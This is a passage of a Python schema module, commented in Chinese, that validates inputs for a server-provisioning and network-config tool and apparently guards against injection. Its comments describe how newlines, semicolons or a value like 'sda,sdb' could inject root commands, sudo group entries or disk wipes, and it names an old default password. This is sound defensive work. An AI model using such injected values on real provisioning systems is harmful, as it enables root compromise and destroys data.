"""Pydantic 请求/响应模型。"""
from __future__ import annotations

import ipaddress
import re
from datetime import datetime
from typing import Any, Optional

from pydantic import BaseModel, ConfigDict, field_validator, model_serializer, model_validator

# 磁盘标识的两样东西**只在 generator 里实现一次**，这里直接用，不做第二份：
#   · _raid_part_ref —— raid.devices 三种写法（part.NN 1 起 / partN 0 起 / sdaN 1 起）的换算
#   · RHEL_FAMILY    —— RHEL 家族判定（Ubuntu 独有的拒绝规则要按它分岔）
# 理由：白名单这类**常量**可以用漂移测试锁住（见 test_schema_and_generator_whitelists_
# do_not_drift），而**函数**锁不住 —— 两层各抄一份换算，基准一旦漂移就会让同一个 RAID 成员
# 在校验层与生成层指到不同的分区（校验放行、生成物却把另一块分区做成 RAID 成员并抹掉它）。
# 这也是本模块唯一一次 it/ → core/ 的反向依赖，为"单一换算来源"让路。
from app.it.pxe.generator import RHEL_FAMILY as _RHEL_FAMILY, _raid_part_ref


class ORMBase(BaseModel):
    model_config = ConfigDict(from_attributes=True)


# 装机流程只分两条：ubuntu（casper/autoinstall）与 RHEL 家族（anaconda/kickstart）。
# 这一组必须与 generator.RHEL_FAMILY 保持一致 —— 有测试锁住，避免两边漂移。
# 之所以要在入口白名单化：生成器按 `== "ubuntu"` 分岔（其余全走 RHEL 分支），而
# 介质路径只对 RHEL 家族特判；一个 "RHEL"（大写）或拼错的类型，会一边走 anaconda、
# 一边拿到 Ubuntu 风格的介质名（initrd 而非 initrd.img），生成的地址必然是 404。
_OS_TYPE_ALLOWED = ("ubuntu", "rhel", "centos", "rocky", "alma", "almalinux", "redhat")


# ---------- IT 网络配置：输入侧校验辅助（NC2） ----------
_IFNAME_PATTERN = r"^[A-Za-z0-9._:-]{1,32}$"
_HOSTNAME_PATTERN = r"^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?$"
_IFNAME_RE = re.compile(_IFNAME_PATTERN)
_HOSTNAME_RE = re.compile(_HOSTNAME_PATTERN)


def _require_ifname(value: str) -> str:
    """接口名白名单校验（NC2：防 shell 注入）。"""
    if _IFNAME_RE.fullmatch(value) is None:
        raise ValueError(f"invalid interface name {value!r}: must match {_IFNAME_PATTERN}")
    return value


def _require_ipv4(value: str, kind: str) -> str:
    """必须为合法 IPv4 地址；合法时原样返回（NC2）。"""
    # TODO(IPv6): 整个 netconfig 模块只处理 IPv4 —— 地址/掩码/网关一律走 ipaddress.IPv4*，
    # 生成器也只写 addresses/dhcp4（没有 addresses6/dhcp6/SLAAC）。支持 IPv6 是另一件独立
    # 且更大的工作（地址族并存、SLAAC/DHCPv6、路由 metric 与 DNS 分族），不在本次修复范围。
    try:
        ipaddress.IPv4Address(value)
    except ValueError:
        raise ValueError(f"invalid IPv4 {kind}: {value!r}") from None
    return value


def _require_netmask(value: str) -> str:
    """必须为合法且连续的 IPv4 掩码（NC2：拒绝非连续掩码）。"""
    try:
        addr = ipaddress.IPv4Address(value)
    except ValueError:
        raise ValueError(f"invalid IPv4 netmask: {value!r}") from None
    inverted = (~int(addr)) & 0xFFFFFFFF
    if (inverted & (inverted + 1)) != 0:
        raise ValueError(f"non-contiguous IPv4 netmask: {value!r}")
    return value


def _require_dns_list(value: list[str]) -> list[str]:
    """dns 列表每个元素都必须为合法 IPv4（NC2）。"""
    for item in value:
        _require_ipv4(item, kind="dns entry")
    return value


def _require_cidr(value: Optional[int]) -> Optional[int]:
    """cidr 必须为 0..32 范围内的整数（NC2）。"""
    if value is None:
        return None
    if not 0 <= value <= 32:
        raise ValueError(f"cidr must be an integer in 0..32, got {value!r}")
    return value


# ---------- IT 网络配置：跨字段校验辅助（NC3） ----------
# 白名单与 /meta 广告的取值一一对应：netplan 只有 Ubuntu 有 /etc/netplan，
# ifcfg 只有 RHEL 家族有 /etc/sysconfig/network-scripts。两者组合错误时，
# 改前是「静默换成别的格式/别的后端」，运维拿到的东西和选择的不是一回事。
_NET_OS_ALLOWED = ("ubuntu", "rhel")
_NET_FORMAT_ALLOWED = ("nmcli", "netplan", "ifcfg")
_NETPLAN_RENDERER_ALLOWED = ("networkd", "NetworkManager")
_NET_MODE_ALLOWED = ("static", "dhcp")
# 未给掩码时生成器按 /24 处理（见 generator._prefix）。网关同子网检查必须用同一个默认值，
# 否则会留下「校验通过、生成出来的默认路由却不可达」的裂缝。
_DEFAULT_PREFIX = 24


def _netmask_prefix(netmask: str) -> int:
    """把已校验（连续）的 IPv4 掩码折算成前缀长度。"""
    return sum(bin(int(p)).count("1") for p in netmask.split("."))


def _require_mode(value: str) -> str:
    """接口地址模式白名单（NC3）：未知值改前会被当成 static 处理。"""
    m = (value or "").strip().lower()
    if m not in _NET_MODE_ALLOWED:
        raise ValueError(
            f"invalid mode {value!r}: must be one of " + "/".join(_NET_MODE_ALLOWED)
        )
    return m


def _check_l3(
    path: str,
    *,
    mode: Optional[str] = None,
    ip: Optional[str] = None,
    netmask: Optional[str] = None,
    cidr: Optional[int] = None,
    gateway: Optional[str] = None,
    require_ip_when_static: bool = True,
) -> None:
    """一个逻辑接口（物理口/bond/VLAN/网桥）的 IPv4 跨字段校验（NC3）。

    报错信息里带完整字段路径（interfaces[0].gateway），因为前端直接把 detail 显示给运维。
    path 由调用方给出（只有 NetConfigRequest 知道列表下标）。

    - mode=dhcp 与任何静态地址字段互斥：改前 ip/gateway/netmask/cidr 会被静默丢弃；
    - mode=static 必须有 ip：改前实测退化成 DHCP（netplan `dhcp4: true` / nmcli
      `ipv4.method auto` / ifcfg `BOOTPROTO=dhcp`），运维要的静态地址静默消失；
    - cidr 与 netmask 同时给出且不一致 → 报错：改前 cidr 静默覆盖 netmask；
    - gateway 必须落在 ip 所属子网内：改前会生成一条指向不可达网关的默认路由，
      一执行就把机器踢出网络。

    「一个请求里有多个默认网关」不在这里判死：generator._route_metrics 会按声明顺序
    给它们写出确定的 metric（100/200/300…），见那边的注释。
    """
    if mode == "dhcp":
        for fname, val in (("ip", ip), ("gateway", gateway), ("netmask", netmask), ("cidr", cidr)):
            if val is not None and val != "":
                raise ValueError(
                    f"{path}.{fname} 与 mode=dhcp 冲突（会被静默丢弃）："
                    f"要静态地址请把 mode 改成 static，否则请清空 {fname}"
                )
        return

    prefix: Optional[int] = cidr
    if netmask:
        nm_prefix = _netmask_prefix(netmask)
        if prefix is not None and nm_prefix != prefix:
            raise ValueError(
                f"{path}.cidr={prefix} 与 {path}.netmask={netmask} 不一致"
                f"（该掩码等价于 /{nm_prefix}）：两者只能给一个，或给出相互一致的值"
            )
        prefix = nm_prefix

    if mode == "static" and require_ip_when_static and not ip:
        raise ValueError(
            f"{path}.ip 在 mode=static 时不能为空：空地址的静态接口既不是 DHCP 也没有地址，"
            f"请填 ip，或把 mode 改成 dhcp"
        )
    if not ip:
        # bond/bridge 没有 dhcp 开关，无 ip 时与 nmcli/ifcfg 一致按 DHCP 处理（不改这里的既有行为）。
        return
    if gateway:
        p = prefix if prefix is not None else _DEFAULT_PREFIX
        net = ipaddress.IPv4Network(f"{ip}/{p}", strict=False)
        if ipaddress.IPv4Address(gateway) not in net:
            src = (
                f"cidr={cidr}" if cidr is not None
                else (f"netmask={netmask}" if netmask else f"未给掩码时按 /{_DEFAULT_PREFIX}")
            )
            raise ValueError(
                f"{path}.gateway={gateway} 不在 {path}.ip={ip} 所属子网 {net} 内"
                f"（前缀 /{p}，来源 {src}）：生成的默认路由会指向不可达网关，应用后机器会失联"
            )


# ---------- PXE 输入侧校验辅助（D7：防 dnsmasq/iPXE/文件名注入） ----------
_MAC_PATTERN = r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$"
_MAC_RE = re.compile(_MAC_PATTERN)


def _require_mac(value: str) -> str:
    """必须为 aa:bb:cc:dd:ee:ff 形式的 MAC，冒号分隔、大小写不敏感（D7）。

    其余任何字符一律拒绝：换行可向 dnsmasq.conf 注入任意指令（宿主机 root 代码执行），
    `/` 会变成 boot/<tag>.ipxe 的路径片段，空格/分号等同样不允许。
    合法时原样返回（不做大小写归一，保持存量存储与生成行为零变化）。
    """
    if _MAC_RE.fullmatch(value) is None:
        raise ValueError(
            f"invalid MAC {value!r}: must be aa:bb:cc:dd:ee:ff form matching {_MAC_PATTERN}"
        )
    return value


def _require_hostname(value: str) -> str:
    """必须为 RFC1123 单标签主机名（D7；复用 NC2 的 _HOSTNAME_RE）。"""
    if _HOSTNAME_RE.fullmatch(value) is None:
        raise ValueError(
            f"invalid hostname {value!r}: must be an RFC1123 single label matching {_HOSTNAME_PATTERN}"
        )
    return value


# 用户名白名单。admin_user 会落进两个【特权】上下文：
#   · RHEL kickstart 的 %post（装机时以 root 执行）：`mkdir -p /home/<user>/.ssh`、`chown -R <user>:<user>`
#   · Ubuntu autoinstall 的 YAML：`username: <user>`
# 含 `;` 可在 %post 里注入任意 root 命令；含换行可在 YAML 里插入 `groups: [sudo]` 之类的新键。
# 只允许标准 Unix 用户名形态（不以 '-' 开头），生产存量值 'ops'/'a' 均通过。
_USERNAME_PATTERN = r"^[A-Za-z_][A-Za-z0-9_-]{0,31}$"
_USERNAME_RE = re.compile(_USERNAME_PATTERN)


def _require_username(value: str) -> str:
    if _USERNAME_RE.fullmatch(value) is None:
        raise ValueError(
            f"invalid username {value!r}: must match {_USERNAME_PATTERN}"
        )
    return value


# ---------- 认证 ----------
class LoginIn(BaseModel):
    username: str
    password: str


class ChangePasswordIn(BaseModel):
    """修改当前用户口令。要求提供原口令（避免 token 泄露即可直接改口令）。

    新口令给一个最低长度约束：这是本工具唯一的管理入口，太短等于没设。
    """
    old_password: str
    new_password: str

    @field_validator("new_password")
    @classmethod
    def _check_new_password(cls, v: str) -> str:
        if len(v) < 8:
            raise ValueError("新口令至少 8 位")
        if v == "admin@123":
            raise ValueError("不允许把口令设回历史默认值")
        return v


class TokenOut(BaseModel):
    access_token: str
    token_type: str = "bearer"
    display_name: str = ""
    role: str = "admin"


# ---------- 凭据 ----------
class CredentialIn(BaseModel):
    name: str
    username: str
    password: Optional[str] = None
    ssh_key: Optional[str] = None
    enable_secret: Optional[str] = None
    device_type: str = ""
    port: int = 22
    remark: str = ""


class CredentialOut(ORMBase):
    id: str
    name: str
    username: str
    device_type: str
    port: int
    remark: str
    has_password: bool = False
    has_ssh_key: bool = False
    created_at: Optional[datetime] = None


# ---------- 资产 ----------
class AssetIn(BaseModel):
    name: str
    category: str  # ct / it
    vendor: str = ""
    device_role: str = ""
    host: str
    port: int = 22
    device_type: str = ""
    serial: Optional[str] = None
    mac: Optional[str] = None
    location: Optional[str] = None
    tags: dict[str, Any] = {}
    remark: str = ""
    credential_id: Optional[str] = None


class AssetOut(ORMBase):
    id: str
    name: str
    category: str
    vendor: str
    device_role: str
    host: str
    port: int
    device_type: str
    serial: Optional[str] = None
    mac: Optional[str] = None
    location: Optional[str] = None
    tags: dict[str, Any] = {}
    remark: str = ""
    credential_id: Optional[str] = None
    created_at: Optional[datetime] = None


# ---------- 巡检 ----------
class InspectionCreate(BaseModel):
    name: str
    kind: str = "default"        # default / custom
    template: Optional[str] = None
    commands: Optional[list[str]] = None
    asset_ids: list[str] = []


class CommandExecIn(BaseModel):
    """自定义命令即时执行。"""
    asset_ids: list[str]
    commands: list[str]
    disable_pager: bool = True


class MetricItem(BaseModel):
    label: str
    value: Any
    status: str = "ok"   # ok / warning / critical / unknown
    raw_key: str = ""


class InspectionResultOut(ORMBase):
    id: str
    asset_id: str
    asset_name: str
    status: str
    error: str
    metrics: dict[str, Any] = {}
    raw: list[dict[str, Any]] = []
    created_at: Optional[datetime] = None


class InspectionTaskOut(ORMBase):
    id: str
    name: str
    kind: str
    template: Optional[str] = None
    commands: Optional[list[str]] = None
    asset_ids: list[str] = []
    status: str
    created_by: Optional[str] = None
    created_at: Optional[datetime] = None
    finished_at: Optional[datetime] = None


# ---------- 巡检模板 ----------
class TemplateItemIn(BaseModel):
    key: str = ""
    label: str = ""
    command: str = ""
    textfsm: str = ""
    unit: str = ""


class InspectionTemplateIn(BaseModel):
    name: str
    vendor: str = ""
    items: list[TemplateItemIn] = []
    description: str = ""


class InspectionTemplateOut(ORMBase):
    id: str
    name: str
    vendor: str
    is_system: bool = False
    items: list = []
    description: str = ""
    created_at: Optional[datetime] = None


# ---------- PXE 装机：磁盘与分区（方案 C）输入校验 ----------
# 规格 docs/PARTITION.md §2/§4。这里是第 2 层（HTTP 入口），生成器里还有第 3 层兜底。
# 白名单与 generator 的同名常量必须一致 —— 有测试锁住不漂移（同 _OS_TYPE_ALLOWED 的做法）。
_DISK_SIZE_PATTERN = r"^[0-9]+(\.[0-9]+)?[MGTP]$|^rest$|^100%FREE$"
_DISK_SIZE_RE = re.compile(_DISK_SIZE_PATTERN)
_DISK_MOUNT_RE = re.compile(r"^/[A-Za-z0-9._/-]*$")
_DISK_FSTYPE_ALLOWED = ("ext4", "xfs", "btrfs", "fat32", "vfat", "swap")
_DISK_LAYOUT_ALLOWED = ("lvm", "direct", "zfs", "custom")
_DISK_MODE_ALLOWED = ("auto", "name", "match")
_RAID_LEVEL_ALLOWED = (0, 1, 5, 6, 10)
_GROW_SIZE_TOKENS = ("rest", "100%FREE")


def _disk_size_check(v, field: str) -> str:
    s = str(v if v is not None else "").strip()
    if not _DISK_SIZE_RE.fullmatch(s):
        raise ValueError(
            field + " 非法 " + repr(v) + "：只允许 <数字>[MGTP] / rest / 100%FREE"
        )
    return s


def _disk_mount_check(v, field: str) -> str:
    s = str(v if v is not None else "").strip()
    if s in ("", "swap"):
        return s
    if not _DISK_MOUNT_RE.fullmatch(s) or ".." in s:
        raise ValueError(
            field + " 非法 " + repr(v)
            + "：必须是 / 开头的绝对路径（只允许 [A-Za-z0-9._/-]），且不含 .."
        )
    return s


def _disk_fstype_check(v, field: str, mount: str) -> str:
    s = str(v if v is not None else "").strip().lower()
    if mount == "/boot/efi":
        return "fat32"          # UEFI 必需，强制
    if mount == "swap":
        return "swap"
    if s == "":
        return ""
    if s not in _DISK_FSTYPE_ALLOWED:
        raise ValueError(
            field + " 非法 " + repr(v) + "：白名单 " + "|".join(_DISK_FSTYPE_ALLOWED)
        )
    return s


def _disk_ident_check(v, field: str, allow_space: bool = False) -> str:
    """vg/lv/name/serial 之类会被拼进 ks 与 YAML 的值：只允许 [A-Za-z0-9._-]。

    serial/model 允许空格（"INTEL SSDSC2KB480G8" 这种型号名本来就带空格），
    盘名与 vg/lv 不允许 —— 它们会变成设备路径与 ks 标识。
    """
    s = str(v if v is not None else "")
    ok = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-"
    if allow_space:
        ok += " "
    bad = sorted({ch for ch in s if ch not in ok})
    if bad:
        raise ValueError(field + " 含不允许的字符 " + repr("".join(bad)))
    return s.strip()


def _raid_member_index(tok, count: int, field: str):
    """把 raid.devices 的标识折算成 partitions 下标；折算不出来就报错（含字段位置）。

    换算本身在 generator._raid_part_ref（唯一实现，见文件顶部 import），这里只做范围检查。
    """
    idx, _disk_prefix = _raid_part_ref(tok, field)
    if idx is None or not 0 <= idx < count:
        raise ValueError(
            field + " 引用了未定义的分区标识 " + repr(tok)
            + "：本次共 " + str(count) + " 个分区，标识形如 part.01"
        )
    return idx


def _disk_check_layout_rules(dc: dict, os_type: str, disk_scheme: str = "lvm") -> None:
    """依赖 layout / os_type 的磁盘规则（第 2 层）。

    与 generator._disk_plan 里的同名规则一一对应（规则本身必须两层都有）。放在这里而不是
    PxeDiskConfigIn 里，是因为 PxeDiskConfigIn 是 disk_config 的**字段**校验器，看不到同级的
    os_type 与 disk_scheme；而 layout 缺省时要与生成器一样回落到 disk_scheme（前端"自定义"
    就是同时发 disk_scheme=custom 与 layout=custom）。

    规则清单（违反一律 422，且 detail 里点名到字段）：
      · 非 custom 布局：partitions / raid 不会出现在产物里 → 拒绝；
      · 非 custom 布局：data_disks 的 mount / wipe=true 不会出现在产物里 → 拒绝
        （只有 wipe=false+无 mount 例外，它的语义是"别碰这块盘"，见 generator 的 %pre 排除集）；
      · Ubuntu 非 custom + auto + data_disks：subiquity 的 layout.match 没有排除语法，
        "最大盘"可能就是数据盘 → 拒绝（绝不猜一块盘然后 wipe 掉它）；
      · custom 布局必须有一个 / 分区。
    """
    layout = (dc.get("layout") or "").strip().lower() or (disk_scheme or "").strip().lower()
    if layout not in _DISK_LAYOUT_ALLOWED:
        layout = "lvm"              # 未知值：生成器同样回退 lvm（layout 自身另有白名单校验）
    # 只有历史键 disk（或空）时生成器走【既有路径】，layout 根本不参与生成 —— 这里也不能按
    # layout 报错，否则老模板（例如 disk_scheme=custom + {"disk": "sda"}）会被误拒，
    # 而它们原本生成得好好的（既有路径把未知 scheme 当 lvm 处理）。
    if not any(k != "disk" for k in dc):
        return
    target = dc.get("target") or {}
    mode = (target.get("mode") or "").strip().lower()
    name = (target.get("name") or "").strip() or (dc.get("disk") or "").strip()
    if not mode:
        mode = "name" if name else "auto"
    parts = dc.get("partitions") or []
    raid = dc.get("raid") or []
    data = dc.get("data_disks") or []
    custom = layout == "custom"
    if not custom:
        if parts:
            raise ValueError(
                "disk_config.partitions：layout=" + layout
                + " 的分区由安装器自动完成，不能同时给自定义分区表；要自定义请设 layout=custom"
            )
        if raid:
            raise ValueError(
                "disk_config.raid：layout=" + layout
                + " 不生成 RAID（只支持 layout=custom），该配置会被丢弃，故拒绝"
            )
        for i, d in enumerate(data):
            if str((d or {}).get("mount") or "").strip():
                raise ValueError(
                    f"disk_config.data_disks[{i}].mount：layout={layout}"
                    " 不生成数据盘分区/挂载点（只有 layout=custom 才生成），该值会被丢弃，故拒绝"
                )
            if (d or {}).get("wipe") is True:
                raise ValueError(
                    f"disk_config.data_disks[{i}].wipe=true：layout={layout}"
                    " 不清数据盘（只有 layout=custom 才生成 clearpart），该值会被丢弃，故拒绝"
                )
    if (not custom) and mode == "auto" and data and os_type not in _RHEL_FAMILY:
        raise ValueError(
            "disk_config.data_disks：Ubuntu 的非 custom 布局没有排除语法"
            "（subiquity 的 layout.match 只能表达 size/path/serial/model），target.mode=auto 时"
            "可能选中并抹掉数据盘；请把 target.mode 设为 name 或 match，或改用 layout=custom"
        )
    if custom:
        for i, d in enumerate(data):
            # wipe=false 表示"不碰这块盘上的既有分区表"，那就没有地方可以安全地新建并挂载一个
            # 分区（挂载既有文件系统我们表达不出来）—— mount 会被丢掉，所以拒绝。
            if (str((d or {}).get("mount") or "").strip()
                    and (d or {}).get("wipe") is not True):
                raise ValueError(
                    f"disk_config.data_disks[{i}].mount：wipe=false 时不会给数据盘建分区/格式化，"
                    "挂载点会被丢弃，故拒绝；要建分区并挂载请设 wipe=true（或去掉 mount）"
                )
    if custom and not any(str((p or {}).get("mount") or "").strip() == "/" for p in parts):
        raise ValueError(
            "disk_config.partitions：layout=custom 必须有一个 / 分区（没有 / 的系统起不来）"
        )


class PxePartitionIn(BaseModel):
    """一个分区（或一个 LVM 逻辑卷）的输入。"""
    model_config = ConfigDict(extra="allow")
    mount: str = ""       # "" = 只建分区不挂载；swap = 交换分区
    size: str = ""        # 512M / 20G / rest / 100%FREE
    fstype: str = ""
    vg: str = ""          # vg/lv 同时给出 = 该分区进 LVM
    lv: str = ""


class PxeRaidIn(BaseModel):
    model_config = ConfigDict(extra="allow")
    name: str = ""
    level: int = 1
    devices: list[str] = []
    mount: str = ""
    fstype: str = ""


class PxeDataDiskIn(BaseModel):
    model_config = ConfigDict(extra="allow")
    name: str
    mount: str = ""
    fstype: str = ""
    wipe: bool = False    # 生产红线：数据盘默认不碰


class PxeDiskTargetIn(BaseModel):
    model_config = ConfigDict(extra="allow")
    mode: str = ""        # auto(默认) / name / match
    name: str = ""
    serial: str = ""
    model: str = ""
    min_size_gb: int = 0


class PxeDiskConfigIn(BaseModel):
    """disk_config 的结构化模型（规格 §2）。

    extra="allow"：历史键 "disk"（前端一直只发 {disk: <盘名>}）以及将来新增的键都要能存下来，
    不能因为模型不认识就被静默丢掉。
    """
    model_config = ConfigDict(extra="allow")

    disk: str = ""
    target: PxeDiskTargetIn = PxeDiskTargetIn()
    wipe: bool = True
    layout: str = ""
    partitions: list[PxePartitionIn] = []
    raid: list[PxeRaidIn] = []
    data_disks: list[PxeDataDiskIn] = []


    @field_validator("disk")
    @classmethod
    def _check_legacy_disk(cls, v: str) -> str:
        """历史键 disk 会被拼进 ks 的 --drives=/--ondisk=/--boot-drive=。

        必须是**盘名标识**（[A-Za-z0-9._-]），不能只拦控制字符：`--drives=` 是逗号分隔的
        多盘语法，disk="sda,sdb" 会生成 `clearpart --drives=sda,sdb --all --initlabel`，
        把第二块（数据）盘一起抹掉。合法盘名恒等，所以既有模板的输出一个字节都不变。
        """
        return _disk_ident_check(v, "disk")


    @field_validator("layout")
    @classmethod
    def _check_layout(cls, v: str) -> str:
        s = (v or "").strip().lower()
        if s and s not in _DISK_LAYOUT_ALLOWED:
            raise ValueError(
                f"layout 非法 {v!r}：只允许 " + "|".join(_DISK_LAYOUT_ALLOWED)
            )
        return s


    @field_validator("target")
    @classmethod
    def _check_target(cls, v):
        """只校验、不回写：回写会把 name/serial/model 标成"已设置"，
        于是 model_dump(exclude_unset=True) 会往库里塞一堆空串（生成器其实不看它们）。"""
        mode = (v.mode or "").strip().lower()
        if mode and mode not in _DISK_MODE_ALLOWED:
            raise ValueError(
                f"target.mode 非法 {v.mode!r}：只允许 " + "|".join(_DISK_MODE_ALLOWED)
            )
        for f in ("name", "serial", "model"):
            _disk_ident_check(getattr(v, f), "target." + f, allow_space=(f != "name"))
        if v.min_size_gb is None or isinstance(v.min_size_gb, bool) or v.min_size_gb < 0:
            raise ValueError("target.min_size_gb 必须是非负整数")
        return v


    @field_validator("partitions", mode="before")
    @classmethod
    def _check_partitions(cls, v):
        """逐条白名单，报错必须点名第几个分区（前端要直接显示给运维）。"""
        if not isinstance(v, list):
            raise ValueError("partitions 必须是数组")
        for i, p in enumerate(v):
            if not isinstance(p, dict):
                raise ValueError(f"partitions[{i}] 必须是对象")
            mount = _disk_mount_check(p.get("mount", ""), f"partitions[{i}].mount")
            size = _disk_size_check(p.get("size", ""), f"partitions[{i}].size")
            vg = _disk_ident_check(p.get("vg", ""), f"partitions[{i}].vg")
            lv = _disk_ident_check(p.get("lv", ""), f"partitions[{i}].lv")
            if bool(vg) != bool(lv):
                raise ValueError(
                    f"partitions[{i}]：vg 与 lv 必须同时给出（只给其一是非法配置）"
                )
            if not size and not (vg and lv):
                raise ValueError(f"partitions[{i}].size 不能为空")
            _disk_fstype_check(p.get("fstype", ""), f"partitions[{i}].fstype", mount)
        return v


    @field_validator("raid", mode="before")
    @classmethod
    def _check_raid(cls, v):
        if v is None:
            return []
        if not isinstance(v, list):
            raise ValueError("raid 必须是数组")
        for i, r in enumerate(v):
            if not isinstance(r, dict):
                raise ValueError(f"raid[{i}] 必须是对象")
            lvl = r.get("level", 1)
            if isinstance(lvl, bool) or not isinstance(lvl, int):
                raise ValueError(f"raid[{i}].level 必须是整数 0/1/5/6/10")
            if lvl not in _RAID_LEVEL_ALLOWED:
                raise ValueError(
                    f"raid[{i}].level 非法 {lvl!r}：只允许 0/1/5/6/10"
                )
            mount = _disk_mount_check(r.get("mount", ""), f"raid[{i}].mount")
            _disk_fstype_check(r.get("fstype", ""), f"raid[{i}].fstype", mount)
            _disk_ident_check(r.get("name", ""), f"raid[{i}].name")
            if not r.get("devices"):
                raise ValueError(f"raid[{i}].devices 不能为空")
        return v


    @field_validator("data_disks", mode="before")
    @classmethod
    def _check_data_disks(cls, v):
        if v is None:
            return []
        if not isinstance(v, list):
            raise ValueError("data_disks 必须是数组")
        for i, d in enumerate(v):
            if not isinstance(d, dict):
                raise ValueError(f"data_disks[{i}] 必须是对象")
            if not _disk_ident_check(d.get("name", ""), f"data_disks[{i}].name"):
                raise ValueError(f"data_disks[{i}].name 不能为空")
            mount = _disk_mount_check(d.get("mount", ""), f"data_disks[{i}].mount")
            _disk_fstype_check(d.get("fstype", ""), f"data_disks[{i}].fstype", mount)
        return v


    @model_validator(mode="after")
    def _check_combinations(self):
        """跨字段规则（规格 §4）：rest 位置、efi/root、VG 内 rest 唯一、raid 引用、数据盘重名。

        这里只放**与 layout/os_type 无关**的规则；依赖 layout 的规则在 _disk_check_layout_rules()
        （PxeProfileIn 那一层才知道 os_type 与 disk_scheme 的回落值）。两层都必须报错并点名字段。
        """
        parts = self.partitions
        mounts = [p.mount for p in parts]
        for i, p in enumerate(parts):
            if p.size in _GROW_SIZE_TOKENS and i != len(parts) - 1:
                raise ValueError(
                    f"partitions[{i}].size={p.size} 只能出现在最后一个分区"
                )
        if len([m for m in mounts if m == "/boot/efi"]) > 1:
            raise ValueError("partitions：/boot/efi 只能有 0 或 1 个")
        if "/boot/efi" in mounts and "/" not in mounts:
            raise ValueError("partitions：有 /boot/efi 却没有 / 分区（系统起不来）")
        # 挂载点唯一性：同一个挂载点建两遍，安装器会在中途报错，甚至反复格式化同一处。
        # 空挂载点（只建分区）不参与 —— 允许出现多次。
        seen_mount: dict = {}
        for i, m in enumerate(mounts):
            if not m:
                continue
            if m in seen_mount:
                raise ValueError(
                    f"partitions[{i}].mount：挂载点 {m} 与 partitions[{seen_mount[m]}] 重复"
                )
            seen_mount[m] = i
        # 同一个 (vg, lv) 只能出现一次：重复的 logvol 名会把两块分区叠到同一个 LV 上。
        seen_lv: dict = {}
        for i, p in enumerate(parts):
            if not p.vg:
                continue
            if (p.vg, p.lv) in seen_lv:
                raise ValueError(
                    f"partitions[{i}].lv：{p.vg}/{p.lv} 与 partitions[{seen_lv[(p.vg, p.lv)]}] 重复"
                )
            seen_lv[(p.vg, p.lv)] = i
        vgs: dict = {}
        for i, p in enumerate(parts):
            if p.vg:
                vgs.setdefault(p.vg, []).append(i)
        for vg, idxs in vgs.items():
            grows = [i for i in idxs if parts[i].size in _GROW_SIZE_TOKENS]
            if len(grows) > 1:
                raise ValueError(
                    f"partitions[{grows[1]}].size：同一 VG({vg}) 内只能有一个 lv 用 rest/100%FREE"
                )
        raid_indexes = set()
        raid_disk_specs = []
        for i, r in enumerate(self.raid):
            field = f"raid[{i}].devices"
            for d in r.devices:
                idx, disk_prefix = _raid_part_ref(d, field)
                if idx is None or not 0 <= idx < len(parts):
                    raise ValueError(
                        field + " 引用了未定义的分区标识 " + repr(d)
                        + "：本次共 " + str(len(parts)) + " 个分区，标识形如 part.01"
                    )
                if disk_prefix:
                    raid_disk_specs.append((field, d, disk_prefix))
                raid_indexes.add(idx)
        # 同一个分区不能既当 LVM PV 又当 RAID 成员（anaconda 会把它同时塞进 volgroup 与 mdadm）。
        for i, p in enumerate(parts):
            if p.vg and i in raid_indexes:
                raise ValueError(
                    f"partitions[{i}]：同一个分区不能既是 LVM PV（.vg/.lv 已给）"
                    f"又是 RAID 成员（raid[].devices 引用了它）"
                )
        # RAID 成员的盘名前缀撞上数据盘：用户想在这块盘上做 RAID，又声明它是"别碰"的数据盘。
        dnames = [(d.name or "").strip() for d in self.data_disks]
        for field, tok, prefix in raid_disk_specs:
            if prefix in dnames:
                raise ValueError(
                    field + " 的 " + repr(tok) + " 把 " + repr(prefix)
                    + " 当作 RAID 成员，但该盘在 data_disks 里声明为数据盘 —— 二者矛盾"
                )
        # 数据盘名唯一性
        seen_d = set()
        for i, d in enumerate(self.data_disks):
            dn = (d.name or "").strip()
            if dn in seen_d:
                raise ValueError(f"data_disks[{i}].name：数据盘 {dn!r} 重复声明")
            seen_d.add(dn)
        # RAID 设备名唯一性（缺省是 md0/md1…，显式给的名字也算）
        rnames = [(r.name or "").strip() or f"md{i}" for i, r in enumerate(self.raid)]
        dup_r = [n for n in rnames if rnames.count(n) > 1]
        if dup_r:
            raise ValueError(
                f"raid[].name：{dup_r[0]!r} 重复（RAID 设备名必须唯一）"
            )
        # 目标盘与数据盘同名：**只在 target.mode=name（或由 name 推断出的 name 模式）时**才算
        # 矛盾 —— auto/match 下 name 不参与选盘，声明同名数据盘是允许的。
        tname = (self.target.name or "").strip() or (self.disk or "").strip()
        tmode = (self.target.mode or "").strip().lower()
        if not tmode:
            tmode = "name" if tname else "auto"
        if tmode == "name" and tname:
            for i, d in enumerate(self.data_disks):
                if (d.name or "").strip() == tname:
                    raise ValueError(
                        f"data_disks[{i}].name 不能与目标盘同名 {tname!r}（target.mode=name）"
                    )
        return self


# ---------- PXE 装机 ----------
class PxeProfileIn(BaseModel):
    name: str
    os_type: str = "ubuntu"       # ubuntu / RHEL 家族（rhel/centos/rocky/alma/almalinux/redhat）

    @field_validator("os_type")
    @classmethod
    def _check_os_type(cls, v: str) -> str:
        """小写归一化 + 白名单（理由见 _OS_TYPE_ALLOWED 上方注释）。"""
        t = (v or "").strip().lower()
        if t not in _OS_TYPE_ALLOWED:
            raise ValueError(
                f"invalid os_type {v!r}: must be one of " + "/".join(_OS_TYPE_ALLOWED)
            )
        return t
    os_version: str = "22.04"
    timezone: str = "Asia/Shanghai"
    locale: str = "en_US.UTF-8"
    keyboard: str = "us"
    admin_user: str = "ops"


    @field_validator("admin_user")
    @classmethod
    def _check_admin_user(cls, v: str) -> str:
        return _require_username(v)
    admin_password: Optional[str] = None
    root_password: Optional[str] = None
    ssh_keys: list[str] = []
    disk_scheme: str = "lvm"      # lvm / direct
    # 结构化磁盘配置（方案 C）。校验走 PxeDiskConfigIn（第 2 层），但**返回普通 dict**：
    # 它会原样存进 models.PxeProfile.disk_config(JSON) 并传给 generator.PxeConfig，
    # 换成 pydantic 对象会让 SQLAlchemy 落库与生成器 dc.get() 全部失效。
    # 只回填"用户真正给过的键"（exclude_unset）：只有历史键 {disk: x} 时，生成器仍然
    # 走既有路径 —— 这是回归红线 §5.1 的前提。
    disk_config: dict[str, Any] = {}


    @field_validator("disk_config")
    @classmethod
